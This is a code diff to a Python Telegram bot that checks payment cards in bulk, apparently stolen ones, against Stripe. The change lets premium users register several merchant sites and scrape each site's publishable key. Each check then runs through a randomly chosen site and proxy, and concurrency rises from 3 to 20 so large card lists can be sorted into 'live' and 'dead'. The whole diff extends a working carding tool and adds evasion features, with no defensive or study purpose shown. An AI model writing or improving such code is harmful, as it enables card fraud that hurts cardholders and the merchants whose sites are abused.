@@ -22,12 +22,19 @@ fn   = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) 
 jn   = lambda h, k: (m := re.search(rf'"{k}"\s*:\s*"([^"]+)"', h)) and m.group(1)
 
 # ─── SITE STORAGE ──────────────────────────────────────────────────────────────
+# _stripe_sites = {user_id: [url1, url2, ...]}
+MAX_SITES = 10
+
 def _load_stripe_sites():
     global _stripe_sites
     try:
         with open(_STRIPE_SITES_FILE) as f:
             data = json.load(f)
-        _stripe_sites = {int(k): v for k, v in data.items()}
+        # support both old format (str) and new format (list)
+        result = {}
+        for k, v in data.items():
+            result[int(k)] = v if isinstance(v, list) else [v]
+        _stripe_sites = result
     except Exception:
         _stripe_sites = {}
 
@@ -38,13 +45,25 @@ def _save_stripe_sites():
     except Exception:
         pass
 
-def _get_user_site(user_id):
-    return _stripe_sites.get(user_id)
+def _get_user_sites(user_id):
+    return _stripe_sites.get(user_id, [])
 
-def _set_user_site(user_id, url):
-    _stripe_sites[user_id] = url
+def _add_user_site(user_id, url):
+    sites = _stripe_sites.get(user_id, [])
+    if url not in sites:
+        sites.append(url)
+    _stripe_sites[user_id] = sites
     _save_stripe_sites()
-    _pk_cache.pop(url, None)
+
+def _remove_user_site(user_id, idx):
+    sites = _stripe_sites.get(user_id, [])
+    if 0 <= idx < len(sites):
+        removed = sites.pop(idx)
+        _pk_cache.pop(removed, None)
+        _stripe_sites[user_id] = sites
+        _save_stripe_sites()
+        return removed
+    return None
 
 def _normalize_url(url):
     url = url.strip().rstrip('/')
@@ -307,13 +326,16 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         pk      = await _scrape_pk(url, proxy)
 
         if pk:
-            _set_user_site(user_id, url)
+            _add_user_site(user_id, url)
+            sites  = _get_user_sites(user_id)
             masked = pk[:12] + '...' + pk[-4:]
             await wait.edit(
                 f"✅ <b>Stripe Site Added!</b>\n\n"
-                f"🌐 <b>Site</b>  ▸  <code>{url}</code>\n"
-                f"🔑 <b>PK</b>    ▸  <code>{masked}</code>\n\n"
-                f"Now use <code>/st cc|mm|yy|cvv</code> or <code>/stxt</code>.",
+                f"🌐 <b>Site</b>   ▸  <code>{url}</code>\n"
+                f"🔑 <b>PK</b>     ▸  <code>{masked}</code>\n"
+                f"📊 <b>Total</b>  ▸  {len(sites)} site(s)\n\n"
+                f"Use <code>/slist</code> to see all sites.\n"
+                f"Use <code>/st cc|mm|yy|cvv</code> or <code>/stxt</code> to check cards.",
                 parse_mode='html'
             )
         else:
@@ -323,6 +345,56 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
                 parse_mode='html'
             )
 
+    # ── /slist ─────────────────────────────────────────────────────────────────
+    @bot.on(events.NewMessage(pattern=r'^/slist(\s|$)'))
+    async def slist_handler(event):
+        user_id = event.sender_id
+        if not is_premium_fn(user_id):
+            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
+            return
+        sites = _get_user_sites(user_id)
+        if not sites:
+            await event.reply(
+                "❌ <b>No sites configured.</b>\n\nUse <code>/sadd https://yoursite.com</code>",
+                parse_mode='html'
+            )
+            return
+        lines = '\n'.join(
+            f"<b>{i+1}.</b> <code>{s}</code>"
+            + (f"  🔑 <i>{_pk_cache[s][:12]}...</i>" if s in _pk_cache else "")
+            for i, s in enumerate(sites)
+        )
+        await event.reply(
+            f"🌐 <b>Your Stripe Sites ({len(sites)}/{MAX_SITES})</b>\n"
+            f"━━━━━━━━━━━━━━━\n{lines}\n\n"
+            f"Remove: <code>/srem &lt;number&gt;</code>",
+            parse_mode='html'
+        )
+
+    # ── /srem ──────────────────────────────────────────────────────────────────
+    @bot.on(events.NewMessage(pattern=r'^/srem(\s|$)'))
+    async def srem_handler(event):
+        user_id = event.sender_id
+        if not is_premium_fn(user_id):
+            await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
+            return
+        parts = event.raw_text.split(maxsplit=1)
+        if len(parts) < 2 or not parts[1].strip().isdigit():
+            await event.reply(
+                "❌ <b>Usage:</b> <code>/srem &lt;number&gt;</code>\n"
+                "Use <code>/slist</code> to see site numbers.",
+                parse_mode='html'
+            )
+            return
+        idx     = int(parts[1].strip()) - 1
+        removed = _remove_user_site(user_id, idx)
+        if removed:
+            await event.reply(
+                f"🗑 <b>Removed:</b> <code>{removed}</code>", parse_mode='html'
+            )
+        else:
+            await event.reply("❌ Invalid number. Use <code>/slist</code>.", parse_mode='html')
+
     # ── /st ────────────────────────────────────────────────────────────────────
     @bot.on(events.NewMessage(pattern=r'^/st(\s|$)'))
     async def st_handler(event):
@@ -331,8 +403,8 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
             return
 
-        site = _get_user_site(user_id)
-        if not site:
+        sites = _get_user_sites(user_id)
+        if not sites:
             await event.reply(
                 "❌ <b>No Stripe site set.</b>\n\n"
                 "Use <code>/sadd https://yoursite.com</code> first.",
@@ -352,14 +424,16 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             )
             return
 
+        site    = random.choice(sites)
+        proxies = load_proxies_fn(user_id)
+        proxy   = random.choice(proxies) if proxies else None
+
         pk = _pk_cache.get(site)
         if not pk:
-            proxies = load_proxies_fn(user_id)
-            proxy   = random.choice(proxies) if proxies else None
-            pk      = await _scrape_pk(site, proxy)
+            pk = await _scrape_pk(site, proxy)
         if not pk:
             await event.reply(
-                "❌ No Stripe PK on your site. Reconfigure with <code>/sadd</code>.",
+                f"❌ No PK on <code>{site}</code>. Remove with <code>/srem</code>.",
                 parse_mode='html'
             )
             return
@@ -369,8 +443,6 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             parse_mode='html'
         )
         t0      = time.time()
-        proxies = load_proxies_fn(user_id)
-        proxy   = random.choice(proxies) if proxies else None
         result  = await stripe_auth(card, site, pk, proxy_str=proxy)
         elapsed = round(time.time() - t0, 2)
 
@@ -396,8 +468,8 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             await event.reply("❌ <b>Access Denied.</b> Premium only.", parse_mode='html')
             return
 
-        site = _get_user_site(user_id)
-        if not site:
+        sites = _get_user_sites(user_id)
+        if not sites:
             await event.reply(
                 "❌ <b>No Stripe site set.</b>\n\n"
                 "Use <code>/sadd https://yoursite.com</code> first.",
@@ -416,14 +488,17 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             await event.reply("❌ Please reply to a <b>.txt</b> file.", parse_mode='html')
             return
 
-        pk = _pk_cache.get(site)
-        if not pk:
-            proxies = load_proxies_fn(user_id)
-            proxy   = random.choice(proxies) if proxies else None
-            pk      = await _scrape_pk(site, proxy)
-        if not pk:
+        # pre-warm PK cache for all sites
+        proxies = load_proxies_fn(user_id)
+        for _s in list(sites):
+            if _s not in _pk_cache:
+                _proxy = random.choice(proxies) if proxies else None
+                await _scrape_pk(_s, _proxy)
+
+        valid_sites = [s for s in sites if s in _pk_cache]
+        if not valid_sites:
             await event.reply(
-                "❌ No Stripe PK on your site. Reconfigure with <code>/sadd</code>.",
+                "❌ No Stripe PK found on any of your sites. Reconfigure with <code>/sadd</code>.",
                 parse_mode='html'
             )
             return
@@ -446,7 +521,6 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
         if not is_owner_fn(user_id) and len(cards) > MAX_CARDS:
             cards = cards[:MAX_CARDS]
 
-        proxies  = load_proxies_fn(user_id)
         total    = len(cards)
         chat_id  = event.chat_id
         results  = {'live': [], 'dead': [], 'error': 0, 'start': time.time()}
@@ -489,7 +563,7 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             except Exception:
                 pass
 
-        semaphore = asyncio.Semaphore(3)
+        semaphore = asyncio.Semaphore(20)
 
         async def _check_one(card, idx):
             if _stop[0]:
@@ -497,6 +571,8 @@ def register_handlers(bot, is_premium_fn, is_owner_fn, load_proxies_fn):
             async with semaphore:
                 if _stop[0]:
                     return
+                site   = random.choice(valid_sites)
+                pk     = _pk_cache[site]
                 proxy  = random.choice(proxies) if proxies else None
                 result = await stripe_auth(card, site, pk, proxy_str=proxy)
                 st     = result['status']
